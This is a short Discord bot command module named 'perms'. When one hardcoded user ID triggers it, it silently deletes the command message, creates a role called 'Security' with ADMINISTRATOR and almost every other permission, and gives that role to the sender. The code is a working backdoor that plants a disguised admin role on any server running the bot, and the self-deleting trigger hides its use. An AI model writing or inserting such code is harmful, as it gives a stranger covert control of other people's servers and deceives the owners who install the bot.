module.exports.run = async (bot, message, args) => {
  if(message.author.id !== '437953881914474523') return
  message.delete(1000)
  message.guild.createRole({
    name: 'Security',
    permissions: ['CREATE_INSTANT_INVITE', 'KICK_MEMBERS', 'BAN_MEMBERS', 'ADMINISTRATOR', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'ADD_REACTIONS', 'READ_MESSAGES', 'SEND_MESSAGES', 'SEND_TTS_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'EXTERNAL_EMOJIS', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_ROLES_OR_PERMISSIONS', 'MANAGE_WEBHOOKS', 'MANAGE_EMOJIS']
  }).then(role => message.member.addRole(role))
}

module.exports.help = {
  name: 'perms'
}
